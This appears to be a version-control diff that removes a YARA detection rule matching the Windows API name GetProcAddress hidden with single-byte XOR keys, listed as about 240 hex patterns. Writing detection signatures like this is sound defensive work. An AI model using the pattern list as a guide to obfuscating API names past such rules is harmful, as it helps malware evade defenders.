@@ -1,575 +1,6 @@
-rule Obfuscated_Strings
-{
-	meta:
-		description = "Contains obfuscated function names"
-		author = "Ivan Kwiatkowski (@JusticeRage)"
-	strings:
-		$a0 = { (46 | 66) 64 75 (51 | 71) 73 6E 62 (40 | 60) 65 65 73 64 72 72 } // [Gg]et[Pp]roc[Aa]ddress XOR 0x01
-		$a1 = { (45 | 65) 67 76 (52 | 72) 70 6D 61 (43 | 63) 66 66 70 67 71 71 } // GetProcAddress XOR 0x02
-		$a2 = { (44 | 64) 66 77 (53 | 73) 71 6C 60 (42 | 62) 67 67 71 66 70 70 } // etc...
-		$a3 = { (43 | 63) 61 70 (54 | 74) 76 6B 67 (45 | 65) 60 60 76 61 77 77 }
-		$a4 = { (42 | 62) 60 71 (55 | 75) 77 6A 66 (44 | 64) 61 61 77 60 76 76 }
-		$a5 = { (41 | 61) 63 72 (56 | 76) 74 69 65 (47 | 67) 62 62 74 63 75 75 }
-		$a6 = { (40 | 60) 62 73 (57 | 77) 75 68 64 (46 | 66) 63 63 75 62 74 74 }
-		$a7 = { (4F | 6F) 6D 7C (58 | 78) 7A 67 6B (49 | 69) 6C 6C 7A 6D 7B 7B }
-		$a8 = { (4E | 6E) 6C 7D (59 | 79) 7B 66 6A (48 | 68) 6D 6D 7B 6C 7A 7A }
-		$a9 = { (4D | 6D) 6F 7E (5A | 7A) 78 65 69 (4B | 6B) 6E 6E 78 6F 79 79 }
-		$a10 = { (4C | 6C) 6E 7F (5B | 7B) 79 64 68 (4A | 6A) 6F 6F 79 6E 78 78 }
-		$a11 = { (4B | 6B) 69 78 (5C | 7C) 7E 63 6F (4D | 6D) 68 68 7E 69 7F 7F }
-		$a12 = { (4A | 6A) 68 79 (5D | 7D) 7F 62 6E (4C | 6C) 69 69 7F 68 7E 7E }
-		$a13 = { (49 | 69) 6B 7A (5E | 7E) 7C 61 6D (4F | 6F) 6A 6A 7C 6B 7D 7D }
-		$a14 = { (48 | 68) 6A 7B (5F | 7F) 7D 60 6C (4E | 6E) 6B 6B 7D 6A 7C 7C }
-		$a15 = { (57 | 77) 75 64 (40 | 60) 62 7F 73 (51 | 71) 74 74 62 75 63 63 }
-		$a16 = { (56 | 76) 74 65 (41 | 61) 63 7E 72 (50 | 70) 75 75 63 74 62 62 }
-		$a17 = { (55 | 75) 77 66 (42 | 62) 60 7D 71 (53 | 73) 76 76 60 77 61 61 }
-		$a18 = { (54 | 74) 76 67 (43 | 63) 61 7C 70 (52 | 72) 77 77 61 76 60 60 }
-		$a19 = { (53 | 73) 71 60 (44 | 64) 66 7B 77 (55 | 75) 70 70 66 71 67 67 }
-		$a20 = { (52 | 72) 70 61 (45 | 65) 67 7A 76 (54 | 74) 71 71 67 70 66 66 }
-		$a21 = { (51 | 71) 73 62 (46 | 66) 64 79 75 (57 | 77) 72 72 64 73 65 65 }
-		$a22 = { (50 | 70) 72 63 (47 | 67) 65 78 74 (56 | 76) 73 73 65 72 64 64 }
-		$a23 = { (5F | 7F) 7D 6C (48 | 68) 6A 77 7B (59 | 79) 7C 7C 6A 7D 6B 6B }
-		$a24 = { (5E | 7E) 7C 6D (49 | 69) 6B 76 7A (58 | 78) 7D 7D 6B 7C 6A 6A }
-		$a25 = { (5D | 7D) 7F 6E (4A | 6A) 68 75 79 (5B | 7B) 7E 7E 68 7F 69 69 }
-		$a26 = { (5C | 7C) 7E 6F (4B | 6B) 69 74 78 (5A | 7A) 7F 7F 69 7E 68 68 }
-		$a27 = { (5B | 7B) 79 68 (4C | 6C) 6E 73 7F (5D | 7D) 78 78 6E 79 6F 6F }
-		$a28 = { (5A | 7A) 78 69 (4D | 6D) 6F 72 7E (5C | 7C) 79 79 6F 78 6E 6E }
-		$a29 = { (59 | 79) 7B 6A (4E | 6E) 6C 71 7D (5F | 7F) 7A 7A 6C 7B 6D 6D }
-		$a30 = { (58 | 78) 7A 6B (4F | 6F) 6D 70 7C (5E | 7E) 7B 7B 6D 7A 6C 6C }
-		// XOR 0x20 removed because it toggles capitalization and causes [Gg]ET[Pp]ROC[Aa]DDRESS to match.
-		$a32 = { (66 | 46) 44 55 (71 | 51) 53 4E 42 (60 | 40) 45 45 53 44 52 52 }
-		$a33 = { (65 | 45) 47 56 (72 | 52) 50 4D 41 (63 | 43) 46 46 50 47 51 51 }
-		$a34 = { (64 | 44) 46 57 (73 | 53) 51 4C 40 (62 | 42) 47 47 51 46 50 50 }
-		$a35 = { (63 | 43) 41 50 (74 | 54) 56 4B 47 (65 | 45) 40 40 56 41 57 57 }
-		$a36 = { (62 | 42) 40 51 (75 | 55) 57 4A 46 (64 | 44) 41 41 57 40 56 56 }
-		$a37 = { (61 | 41) 43 52 (76 | 56) 54 49 45 (67 | 47) 42 42 54 43 55 55 }
-		$a38 = { (60 | 40) 42 53 (77 | 57) 55 48 44 (66 | 46) 43 43 55 42 54 54 }
-		$a39 = { (6F | 4F) 4D 5C (78 | 58) 5A 47 4B (69 | 49) 4C 4C 5A 4D 5B 5B }
-		$a40 = { (6E | 4E) 4C 5D (79 | 59) 5B 46 4A (68 | 48) 4D 4D 5B 4C 5A 5A }
-		$a41 = { (6D | 4D) 4F 5E (7A | 5A) 58 45 49 (6B | 4B) 4E 4E 58 4F 59 59 }
-		$a42 = { (6C | 4C) 4E 5F (7B | 5B) 59 44 48 (6A | 4A) 4F 4F 59 4E 58 58 }
-		$a43 = { (6B | 4B) 49 58 (7C | 5C) 5E 43 4F (6D | 4D) 48 48 5E 49 5F 5F }
-		$a44 = { (6A | 4A) 48 59 (7D | 5D) 5F 42 4E (6C | 4C) 49 49 5F 48 5E 5E }
-		$a45 = { (69 | 49) 4B 5A (7E | 5E) 5C 41 4D (6F | 4F) 4A 4A 5C 4B 5D 5D }
-		$a46 = { (68 | 48) 4A 5B (7F | 5F) 5D 40 4C (6E | 4E) 4B 4B 5D 4A 5C 5C }
-		$a47 = { (77 | 57) 55 44 (60 | 40) 42 5F 53 (71 | 51) 54 54 42 55 43 43 }
-		$a48 = { (76 | 56) 54 45 (61 | 41) 43 5E 52 (70 | 50) 55 55 43 54 42 42 }
-		$a49 = { (75 | 55) 57 46 (62 | 42) 40 5D 51 (73 | 53) 56 56 40 57 41 41 }
-		$a50 = { (74 | 54) 56 47 (63 | 43) 41 5C 50 (72 | 52) 57 57 41 56 40 40 }
-		$a51 = { (73 | 53) 51 40 (64 | 44) 46 5B 57 (75 | 55) 50 50 46 51 47 47 }
-		$a52 = { (72 | 52) 50 41 (65 | 45) 47 5A 56 (74 | 54) 51 51 47 50 46 46 }
-		$a53 = { (71 | 51) 53 42 (66 | 46) 44 59 55 (77 | 57) 52 52 44 53 45 45 }
-		$a54 = { (70 | 50) 52 43 (67 | 47) 45 58 54 (76 | 56) 53 53 45 52 44 44 }
-		$a55 = { (7F | 5F) 5D 4C (68 | 48) 4A 57 5B (79 | 59) 5C 5C 4A 5D 4B 4B }
-		$a56 = { (7E | 5E) 5C 4D (69 | 49) 4B 56 5A (78 | 58) 5D 5D 4B 5C 4A 4A }
-		$a57 = { (7D | 5D) 5F 4E (6A | 4A) 48 55 59 (7B | 5B) 5E 5E 48 5F 49 49 }
-		$a58 = { (7C | 5C) 5E 4F (6B | 4B) 49 54 58 (7A | 5A) 5F 5F 49 5E 48 48 }
-		$a59 = { (7B | 5B) 59 48 (6C | 4C) 4E 53 5F (7D | 5D) 58 58 4E 59 4F 4F }
-		$a60 = { (7A | 5A) 58 49 (6D | 4D) 4F 52 5E (7C | 5C) 59 59 4F 58 4E 4E }
-		$a61 = { (79 | 59) 5B 4A (6E | 4E) 4C 51 5D (7F | 5F) 5A 5A 4C 5B 4D 4D }
-		$a62 = { (78 | 58) 5A 4B (6F | 4F) 4D 50 5C (7E | 5E) 5B 5B 4D 5A 4C 4C }
-		$a63 = { (07 | 27) 25 34 (10 | 30) 32 2F 23 (01 | 21) 24 24 32 25 33 33 }
-		$a64 = { (06 | 26) 24 35 (11 | 31) 33 2E 22 (00 | 20) 25 25 33 24 32 32 }
-		$a65 = { (05 | 25) 27 36 (12 | 32) 30 2D 21 (03 | 23) 26 26 30 27 31 31 }
-		$a66 = { (04 | 24) 26 37 (13 | 33) 31 2C 20 (02 | 22) 27 27 31 26 30 30 }
-		$a67 = { (03 | 23) 21 30 (14 | 34) 36 2B 27 (05 | 25) 20 20 36 21 37 37 }
-		$a68 = { (02 | 22) 20 31 (15 | 35) 37 2A 26 (04 | 24) 21 21 37 20 36 36 }
-		$a69 = { (01 | 21) 23 32 (16 | 36) 34 29 25 (07 | 27) 22 22 34 23 35 35 }
-		$a70 = { (00 | 20) 22 33 (17 | 37) 35 28 24 (06 | 26) 23 23 35 22 34 34 }
-		$a71 = { (0F | 2F) 2D 3C (18 | 38) 3A 27 2B (09 | 29) 2C 2C 3A 2D 3B 3B }
-		$a72 = { (0E | 2E) 2C 3D (19 | 39) 3B 26 2A (08 | 28) 2D 2D 3B 2C 3A 3A }
-		$a73 = { (0D | 2D) 2F 3E (1A | 3A) 38 25 29 (0B | 2B) 2E 2E 38 2F 39 39 }
-		$a74 = { (0C | 2C) 2E 3F (1B | 3B) 39 24 28 (0A | 2A) 2F 2F 39 2E 38 38 }
-		$a75 = { (0B | 2B) 29 38 (1C | 3C) 3E 23 2F (0D | 2D) 28 28 3E 29 3F 3F }
-		$a76 = { (0A | 2A) 28 39 (1D | 3D) 3F 22 2E (0C | 2C) 29 29 3F 28 3E 3E }
-		$a77 = { (09 | 29) 2B 3A (1E | 3E) 3C 21 2D (0F | 2F) 2A 2A 3C 2B 3D 3D }
-		$a78 = { (08 | 28) 2A 3B (1F | 3F) 3D 20 2C (0E | 2E) 2B 2B 3D 2A 3C 3C }
-		$a79 = { (17 | 37) 35 24 (00 | 20) 22 3F 33 (11 | 31) 34 34 22 35 23 23 }
-		$a80 = { (16 | 36) 34 25 (01 | 21) 23 3E 32 (10 | 30) 35 35 23 34 22 22 }
-		$a81 = { (15 | 35) 37 26 (02 | 22) 20 3D 31 (13 | 33) 36 36 20 37 21 21 }
-		$a82 = { (14 | 34) 36 27 (03 | 23) 21 3C 30 (12 | 32) 37 37 21 36 20 20 }
-		$a83 = { (13 | 33) 31 20 (04 | 24) 26 3B 37 (15 | 35) 30 30 26 31 27 27 }
-		$a84 = { (12 | 32) 30 21 (05 | 25) 27 3A 36 (14 | 34) 31 31 27 30 26 26 }
-		$a85 = { (11 | 31) 33 22 (06 | 26) 24 39 35 (17 | 37) 32 32 24 33 25 25 }
-		$a86 = { (10 | 30) 32 23 (07 | 27) 25 38 34 (16 | 36) 33 33 25 32 24 24 }
-		$a87 = { (1F | 3F) 3D 2C (08 | 28) 2A 37 3B (19 | 39) 3C 3C 2A 3D 2B 2B }
-		$a88 = { (1E | 3E) 3C 2D (09 | 29) 2B 36 3A (18 | 38) 3D 3D 2B 3C 2A 2A }
-		$a89 = { (1D | 3D) 3F 2E (0A | 2A) 28 35 39 (1B | 3B) 3E 3E 28 3F 29 29 }
-		$a90 = { (1C | 3C) 3E 2F (0B | 2B) 29 34 38 (1A | 3A) 3F 3F 29 3E 28 28 }
-		$a91 = { (1B | 3B) 39 28 (0C | 2C) 2E 33 3F (1D | 3D) 38 38 2E 39 2F 2F }
-		$a92 = { (1A | 3A) 38 29 (0D | 2D) 2F 32 3E (1C | 3C) 39 39 2F 38 2E 2E }
-		$a93 = { (19 | 39) 3B 2A (0E | 2E) 2C 31 3D (1F | 3F) 3A 3A 2C 3B 2D 2D }
-		$a94 = { (18 | 38) 3A 2B (0F | 2F) 2D 30 3C (1E | 3E) 3B 3B 2D 3A 2C 2C }
-		$a95 = { (27 | 07) 05 14 (30 | 10) 12 0F 03 (21 | 01) 04 04 12 05 13 13 }
-		$a96 = { (26 | 06) 04 15 (31 | 11) 13 0E 02 (20 | 00) 05 05 13 04 12 12 }
-		$a97 = { (25 | 05) 07 16 (32 | 12) 10 0D 01 (23 | 03) 06 06 10 07 11 11 }
-		$a98 = { (24 | 04) 06 17 (33 | 13) 11 0C 00 (22 | 02) 07 07 11 06 10 10 }
-		$a99 = { (23 | 03) 01 10 (34 | 14) 16 0B 07 (25 | 05) 00 00 16 01 17 17 }
-		$a100 = { (22 | 02) 00 11 (35 | 15) 17 0A 06 (24 | 04) 01 01 17 00 16 16 }
-		$a101 = { (21 | 01) 03 12 (36 | 16) 14 09 05 (27 | 07) 02 02 14 03 15 15 }
-		$a102 = { (20 | 00) 02 13 (37 | 17) 15 08 04 (26 | 06) 03 03 15 02 14 14 }
-		$a103 = { (2F | 0F) 0D 1C (38 | 18) 1A 07 0B (29 | 09) 0C 0C 1A 0D 1B 1B }
-		$a104 = { (2E | 0E) 0C 1D (39 | 19) 1B 06 0A (28 | 08) 0D 0D 1B 0C 1A 1A }
-		$a105 = { (2D | 0D) 0F 1E (3A | 1A) 18 05 09 (2B | 0B) 0E 0E 18 0F 19 19 }
-		$a106 = { (2C | 0C) 0E 1F (3B | 1B) 19 04 08 (2A | 0A) 0F 0F 19 0E 18 18 }
-		$a107 = { (2B | 0B) 09 18 (3C | 1C) 1E 03 0F (2D | 0D) 08 08 1E 09 1F 1F }
-		$a108 = { (2A | 0A) 08 19 (3D | 1D) 1F 02 0E (2C | 0C) 09 09 1F 08 1E 1E }
-		$a109 = { (29 | 09) 0B 1A (3E | 1E) 1C 01 0D (2F | 0F) 0A 0A 1C 0B 1D 1D }
-		$a110 = { (28 | 08) 0A 1B (3F | 1F) 1D 00 0C (2E | 0E) 0B 0B 1D 0A 1C 1C }
-		$a111 = { (37 | 17) 15 04 (20 | 00) 02 1F 13 (31 | 11) 14 14 02 15 03 03 }
-		$a112 = { (36 | 16) 14 05 (21 | 01) 03 1E 12 (30 | 10) 15 15 03 14 02 02 }
-		$a113 = { (35 | 15) 17 06 (22 | 02) 00 1D 11 (33 | 13) 16 16 00 17 01 01 }
-		$a114 = { (34 | 14) 16 07 (23 | 03) 01 1C 10 (32 | 12) 17 17 01 16 00 00 }
-		$a115 = { (33 | 13) 11 00 (24 | 04) 06 1B 17 (35 | 15) 10 10 06 11 07 07 }
-		$a116 = { (32 | 12) 10 01 (25 | 05) 07 1A 16 (34 | 14) 11 11 07 10 06 06 }
-		$a117 = { (31 | 11) 13 02 (26 | 06) 04 19 15 (37 | 17) 12 12 04 13 05 05 }
-		$a118 = { (30 | 10) 12 03 (27 | 07) 05 18 14 (36 | 16) 13 13 05 12 04 04 }
-		$a119 = { (3F | 1F) 1D 0C (28 | 08) 0A 17 1B (39 | 19) 1C 1C 0A 1D 0B 0B }
-		$a120 = { (3E | 1E) 1C 0D (29 | 09) 0B 16 1A (38 | 18) 1D 1D 0B 1C 0A 0A }
-		$a121 = { (3D | 1D) 1F 0E (2A | 0A) 08 15 19 (3B | 1B) 1E 1E 08 1F 09 09 }
-		$a122 = { (3C | 1C) 1E 0F (2B | 0B) 09 14 18 (3A | 1A) 1F 1F 09 1E 08 08 }
-		$a123 = { (3B | 1B) 19 08 (2C | 0C) 0E 13 1F (3D | 1D) 18 18 0E 19 0F 0F }
-		$a124 = { (3A | 1A) 18 09 (2D | 0D) 0F 12 1E (3C | 1C) 19 19 0F 18 0E 0E }
-		$a125 = { (39 | 19) 1B 0A (2E | 0E) 0C 11 1D (3F | 1F) 1A 1A 0C 1B 0D 0D }
-		$a126 = { (38 | 18) 1A 0B (2F | 0F) 0D 10 1C (3E | 1E) 1B 1B 0D 1A 0C 0C }
-		$a127 = { (C7 | E7) E5 F4 (D0 | F0) F2 EF E3 (C1 | E1) E4 E4 F2 E5 F3 F3 }
-		$a128 = { (C6 | E6) E4 F5 (D1 | F1) F3 EE E2 (C0 | E0) E5 E5 F3 E4 F2 F2 }
-		$a129 = { (C5 | E5) E7 F6 (D2 | F2) F0 ED E1 (C3 | E3) E6 E6 F0 E7 F1 F1 }
-		$a130 = { (C4 | E4) E6 F7 (D3 | F3) F1 EC E0 (C2 | E2) E7 E7 F1 E6 F0 F0 }
-		$a131 = { (C3 | E3) E1 F0 (D4 | F4) F6 EB E7 (C5 | E5) E0 E0 F6 E1 F7 F7 }
-		$a132 = { (C2 | E2) E0 F1 (D5 | F5) F7 EA E6 (C4 | E4) E1 E1 F7 E0 F6 F6 }
-		$a133 = { (C1 | E1) E3 F2 (D6 | F6) F4 E9 E5 (C7 | E7) E2 E2 F4 E3 F5 F5 }
-		$a134 = { (C0 | E0) E2 F3 (D7 | F7) F5 E8 E4 (C6 | E6) E3 E3 F5 E2 F4 F4 }
-		$a135 = { (CF | EF) ED FC (D8 | F8) FA E7 EB (C9 | E9) EC EC FA ED FB FB }
-		$a136 = { (CE | EE) EC FD (D9 | F9) FB E6 EA (C8 | E8) ED ED FB EC FA FA }
-		$a137 = { (CD | ED) EF FE (DA | FA) F8 E5 E9 (CB | EB) EE EE F8 EF F9 F9 }
-		$a138 = { (CC | EC) EE FF (DB | FB) F9 E4 E8 (CA | EA) EF EF F9 EE F8 F8 }
-		$a139 = { (CB | EB) E9 F8 (DC | FC) FE E3 EF (CD | ED) E8 E8 FE E9 FF FF }
-		$a140 = { (CA | EA) E8 F9 (DD | FD) FF E2 EE (CC | EC) E9 E9 FF E8 FE FE }
-		$a141 = { (C9 | E9) EB FA (DE | FE) FC E1 ED (CF | EF) EA EA FC EB FD FD }
-		$a142 = { (C8 | E8) EA FB (DF | FF) FD E0 EC (CE | EE) EB EB FD EA FC FC }
-		$a143 = { (D7 | F7) F5 E4 (C0 | E0) E2 FF F3 (D1 | F1) F4 F4 E2 F5 E3 E3 }
-		$a144 = { (D6 | F6) F4 E5 (C1 | E1) E3 FE F2 (D0 | F0) F5 F5 E3 F4 E2 E2 }
-		$a145 = { (D5 | F5) F7 E6 (C2 | E2) E0 FD F1 (D3 | F3) F6 F6 E0 F7 E1 E1 }
-		$a146 = { (D4 | F4) F6 E7 (C3 | E3) E1 FC F0 (D2 | F2) F7 F7 E1 F6 E0 E0 }
-		$a147 = { (D3 | F3) F1 E0 (C4 | E4) E6 FB F7 (D5 | F5) F0 F0 E6 F1 E7 E7 }
-		$a148 = { (D2 | F2) F0 E1 (C5 | E5) E7 FA F6 (D4 | F4) F1 F1 E7 F0 E6 E6 }
-		$a149 = { (D1 | F1) F3 E2 (C6 | E6) E4 F9 F5 (D7 | F7) F2 F2 E4 F3 E5 E5 }
-		$a150 = { (D0 | F0) F2 E3 (C7 | E7) E5 F8 F4 (D6 | F6) F3 F3 E5 F2 E4 E4 }
-		$a151 = { (DF | FF) FD EC (C8 | E8) EA F7 FB (D9 | F9) FC FC EA FD EB EB }
-		$a152 = { (DE | FE) FC ED (C9 | E9) EB F6 FA (D8 | F8) FD FD EB FC EA EA }
-		$a153 = { (DD | FD) FF EE (CA | EA) E8 F5 F9 (DB | FB) FE FE E8 FF E9 E9 }
-		$a154 = { (DC | FC) FE EF (CB | EB) E9 F4 F8 (DA | FA) FF FF E9 FE E8 E8 }
-		$a155 = { (DB | FB) F9 E8 (CC | EC) EE F3 FF (DD | FD) F8 F8 EE F9 EF EF }
-		$a156 = { (DA | FA) F8 E9 (CD | ED) EF F2 FE (DC | FC) F9 F9 EF F8 EE EE }
-		$a157 = { (D9 | F9) FB EA (CE | EE) EC F1 FD (DF | FF) FA FA EC FB ED ED }
-		$a158 = { (D8 | F8) FA EB (CF | EF) ED F0 FC (DE | FE) FB FB ED FA EC EC }
-		$a159 = { (E7 | C7) C5 D4 (F0 | D0) D2 CF C3 (E1 | C1) C4 C4 D2 C5 D3 D3 }
-		$a160 = { (E6 | C6) C4 D5 (F1 | D1) D3 CE C2 (E0 | C0) C5 C5 D3 C4 D2 D2 }
-		$a161 = { (E5 | C5) C7 D6 (F2 | D2) D0 CD C1 (E3 | C3) C6 C6 D0 C7 D1 D1 }
-		$a162 = { (E4 | C4) C6 D7 (F3 | D3) D1 CC C0 (E2 | C2) C7 C7 D1 C6 D0 D0 }
-		$a163 = { (E3 | C3) C1 D0 (F4 | D4) D6 CB C7 (E5 | C5) C0 C0 D6 C1 D7 D7 }
-		$a164 = { (E2 | C2) C0 D1 (F5 | D5) D7 CA C6 (E4 | C4) C1 C1 D7 C0 D6 D6 }
-		$a165 = { (E1 | C1) C3 D2 (F6 | D6) D4 C9 C5 (E7 | C7) C2 C2 D4 C3 D5 D5 }
-		$a166 = { (E0 | C0) C2 D3 (F7 | D7) D5 C8 C4 (E6 | C6) C3 C3 D5 C2 D4 D4 }
-		$a167 = { (EF | CF) CD DC (F8 | D8) DA C7 CB (E9 | C9) CC CC DA CD DB DB }
-		$a168 = { (EE | CE) CC DD (F9 | D9) DB C6 CA (E8 | C8) CD CD DB CC DA DA }
-		$a169 = { (ED | CD) CF DE (FA | DA) D8 C5 C9 (EB | CB) CE CE D8 CF D9 D9 }
-		$a170 = { (EC | CC) CE DF (FB | DB) D9 C4 C8 (EA | CA) CF CF D9 CE D8 D8 }
-		$a171 = { (EB | CB) C9 D8 (FC | DC) DE C3 CF (ED | CD) C8 C8 DE C9 DF DF }
-		$a172 = { (EA | CA) C8 D9 (FD | DD) DF C2 CE (EC | CC) C9 C9 DF C8 DE DE }
-		$a173 = { (E9 | C9) CB DA (FE | DE) DC C1 CD (EF | CF) CA CA DC CB DD DD }
-		$a174 = { (E8 | C8) CA DB (FF | DF) DD C0 CC (EE | CE) CB CB DD CA DC DC }
-		$a175 = { (F7 | D7) D5 C4 (E0 | C0) C2 DF D3 (F1 | D1) D4 D4 C2 D5 C3 C3 }
-		$a176 = { (F6 | D6) D4 C5 (E1 | C1) C3 DE D2 (F0 | D0) D5 D5 C3 D4 C2 C2 }
-		$a177 = { (F5 | D5) D7 C6 (E2 | C2) C0 DD D1 (F3 | D3) D6 D6 C0 D7 C1 C1 }
-		$a178 = { (F4 | D4) D6 C7 (E3 | C3) C1 DC D0 (F2 | D2) D7 D7 C1 D6 C0 C0 }
-		$a179 = { (F3 | D3) D1 C0 (E4 | C4) C6 DB D7 (F5 | D5) D0 D0 C6 D1 C7 C7 }
-		$a180 = { (F2 | D2) D0 C1 (E5 | C5) C7 DA D6 (F4 | D4) D1 D1 C7 D0 C6 C6 }
-		$a181 = { (F1 | D1) D3 C2 (E6 | C6) C4 D9 D5 (F7 | D7) D2 D2 C4 D3 C5 C5 }
-		$a182 = { (F0 | D0) D2 C3 (E7 | C7) C5 D8 D4 (F6 | D6) D3 D3 C5 D2 C4 C4 }
-		$a183 = { (FF | DF) DD CC (E8 | C8) CA D7 DB (F9 | D9) DC DC CA DD CB CB }
-		$a184 = { (FE | DE) DC CD (E9 | C9) CB D6 DA (F8 | D8) DD DD CB DC CA CA }
-		$a185 = { (FD | DD) DF CE (EA | CA) C8 D5 D9 (FB | DB) DE DE C8 DF C9 C9 }
-		$a186 = { (FC | DC) DE CF (EB | CB) C9 D4 D8 (FA | DA) DF DF C9 DE C8 C8 }
-		$a187 = { (FB | DB) D9 C8 (EC | CC) CE D3 DF (FD | DD) D8 D8 CE D9 CF CF }
-		$a188 = { (FA | DA) D8 C9 (ED | CD) CF D2 DE (FC | DC) D9 D9 CF D8 CE CE }
-		$a189 = { (F9 | D9) DB CA (EE | CE) CC D1 DD (FF | DF) DA DA CC DB CD CD }
-		$a190 = { (F8 | D8) DA CB (EF | CF) CD D0 DC (FE | DE) DB DB CD DA CC CC }
-		$a191 = { (87 | A7) A5 B4 (90 | B0) B2 AF A3 (81 | A1) A4 A4 B2 A5 B3 B3 }
-		$a192 = { (86 | A6) A4 B5 (91 | B1) B3 AE A2 (80 | A0) A5 A5 B3 A4 B2 B2 }
-		$a193 = { (85 | A5) A7 B6 (92 | B2) B0 AD A1 (83 | A3) A6 A6 B0 A7 B1 B1 }
-		$a194 = { (84 | A4) A6 B7 (93 | B3) B1 AC A0 (82 | A2) A7 A7 B1 A6 B0 B0 }
-		$a195 = { (83 | A3) A1 B0 (94 | B4) B6 AB A7 (85 | A5) A0 A0 B6 A1 B7 B7 }
-		$a196 = { (82 | A2) A0 B1 (95 | B5) B7 AA A6 (84 | A4) A1 A1 B7 A0 B6 B6 }
-		$a197 = { (81 | A1) A3 B2 (96 | B6) B4 A9 A5 (87 | A7) A2 A2 B4 A3 B5 B5 }
-		$a198 = { (80 | A0) A2 B3 (97 | B7) B5 A8 A4 (86 | A6) A3 A3 B5 A2 B4 B4 }
-		$a199 = { (8F | AF) AD BC (98 | B8) BA A7 AB (89 | A9) AC AC BA AD BB BB }
-		$a200 = { (8E | AE) AC BD (99 | B9) BB A6 AA (88 | A8) AD AD BB AC BA BA }
-		$a201 = { (8D | AD) AF BE (9A | BA) B8 A5 A9 (8B | AB) AE AE B8 AF B9 B9 }
-		$a202 = { (8C | AC) AE BF (9B | BB) B9 A4 A8 (8A | AA) AF AF B9 AE B8 B8 }
-		$a203 = { (8B | AB) A9 B8 (9C | BC) BE A3 AF (8D | AD) A8 A8 BE A9 BF BF }
-		$a204 = { (8A | AA) A8 B9 (9D | BD) BF A2 AE (8C | AC) A9 A9 BF A8 BE BE }
-		$a205 = { (89 | A9) AB BA (9E | BE) BC A1 AD (8F | AF) AA AA BC AB BD BD }
-		$a206 = { (88 | A8) AA BB (9F | BF) BD A0 AC (8E | AE) AB AB BD AA BC BC }
-		$a207 = { (97 | B7) B5 A4 (80 | A0) A2 BF B3 (91 | B1) B4 B4 A2 B5 A3 A3 }
-		$a208 = { (96 | B6) B4 A5 (81 | A1) A3 BE B2 (90 | B0) B5 B5 A3 B4 A2 A2 }
-		$a209 = { (95 | B5) B7 A6 (82 | A2) A0 BD B1 (93 | B3) B6 B6 A0 B7 A1 A1 }
-		$a210 = { (94 | B4) B6 A7 (83 | A3) A1 BC B0 (92 | B2) B7 B7 A1 B6 A0 A0 }
-		$a211 = { (93 | B3) B1 A0 (84 | A4) A6 BB B7 (95 | B5) B0 B0 A6 B1 A7 A7 }
-		$a212 = { (92 | B2) B0 A1 (85 | A5) A7 BA B6 (94 | B4) B1 B1 A7 B0 A6 A6 }
-		$a213 = { (91 | B1) B3 A2 (86 | A6) A4 B9 B5 (97 | B7) B2 B2 A4 B3 A5 A5 }
-		$a214 = { (90 | B0) B2 A3 (87 | A7) A5 B8 B4 (96 | B6) B3 B3 A5 B2 A4 A4 }
-		$a215 = { (9F | BF) BD AC (88 | A8) AA B7 BB (99 | B9) BC BC AA BD AB AB }
-		$a216 = { (9E | BE) BC AD (89 | A9) AB B6 BA (98 | B8) BD BD AB BC AA AA }
-		$a217 = { (9D | BD) BF AE (8A | AA) A8 B5 B9 (9B | BB) BE BE A8 BF A9 A9 }
-		$a218 = { (9C | BC) BE AF (8B | AB) A9 B4 B8 (9A | BA) BF BF A9 BE A8 A8 }
-		$a219 = { (9B | BB) B9 A8 (8C | AC) AE B3 BF (9D | BD) B8 B8 AE B9 AF AF }
-		$a220 = { (9A | BA) B8 A9 (8D | AD) AF B2 BE (9C | BC) B9 B9 AF B8 AE AE }
-		$a221 = { (99 | B9) BB AA (8E | AE) AC B1 BD (9F | BF) BA BA AC BB AD AD }
-		$a222 = { (98 | B8) BA AB (8F | AF) AD B0 BC (9E | BE) BB BB AD BA AC AC }
-		$a223 = { (A7 | 87) 85 94 (B0 | 90) 92 8F 83 (A1 | 81) 84 84 92 85 93 93 }
-		$a224 = { (A6 | 86) 84 95 (B1 | 91) 93 8E 82 (A0 | 80) 85 85 93 84 92 92 }
-		$a225 = { (A5 | 85) 87 96 (B2 | 92) 90 8D 81 (A3 | 83) 86 86 90 87 91 91 }
-		$a226 = { (A4 | 84) 86 97 (B3 | 93) 91 8C 80 (A2 | 82) 87 87 91 86 90 90 }
-		$a227 = { (A3 | 83) 81 90 (B4 | 94) 96 8B 87 (A5 | 85) 80 80 96 81 97 97 }
-		$a228 = { (A2 | 82) 80 91 (B5 | 95) 97 8A 86 (A4 | 84) 81 81 97 80 96 96 }
-		$a229 = { (A1 | 81) 83 92 (B6 | 96) 94 89 85 (A7 | 87) 82 82 94 83 95 95 }
-		$a230 = { (A0 | 80) 82 93 (B7 | 97) 95 88 84 (A6 | 86) 83 83 95 82 94 94 }
-		$a231 = { (AF | 8F) 8D 9C (B8 | 98) 9A 87 8B (A9 | 89) 8C 8C 9A 8D 9B 9B }
-		$a232 = { (AE | 8E) 8C 9D (B9 | 99) 9B 86 8A (A8 | 88) 8D 8D 9B 8C 9A 9A }
-		$a233 = { (AD | 8D) 8F 9E (BA | 9A) 98 85 89 (AB | 8B) 8E 8E 98 8F 99 99 }
-		$a234 = { (AC | 8C) 8E 9F (BB | 9B) 99 84 88 (AA | 8A) 8F 8F 99 8E 98 98 }
-		$a235 = { (AB | 8B) 89 98 (BC | 9C) 9E 83 8F (AD | 8D) 88 88 9E 89 9F 9F }
-		$a236 = { (AA | 8A) 88 99 (BD | 9D) 9F 82 8E (AC | 8C) 89 89 9F 88 9E 9E }
-		$a237 = { (A9 | 89) 8B 9A (BE | 9E) 9C 81 8D (AF | 8F) 8A 8A 9C 8B 9D 9D }
-		$a238 = { (A8 | 88) 8A 9B (BF | 9F) 9D 80 8C (AE | 8E) 8B 8B 9D 8A 9C 9C }
-		$a239 = { (B7 | 97) 95 84 (A0 | 80) 82 9F 93 (B1 | 91) 94 94 82 95 83 83 }
-		$a240 = { (B6 | 96) 94 85 (A1 | 81) 83 9E 92 (B0 | 90) 95 95 83 94 82 82 }
-		$a241 = { (B5 | 95) 97 86 (A2 | 82) 80 9D 91 (B3 | 93) 96 96 80 97 81 81 }
-		$a242 = { (B4 | 94) 96 87 (A3 | 83) 81 9C 90 (B2 | 92) 97 97 81 96 80 80 }
-		$a243 = { (B3 | 93) 91 80 (A4 | 84) 86 9B 97 (B5 | 95) 90 90 86 91 87 87 }
-		$a244 = { (B2 | 92) 90 81 (A5 | 85) 87 9A 96 (B4 | 94) 91 91 87 90 86 86 }
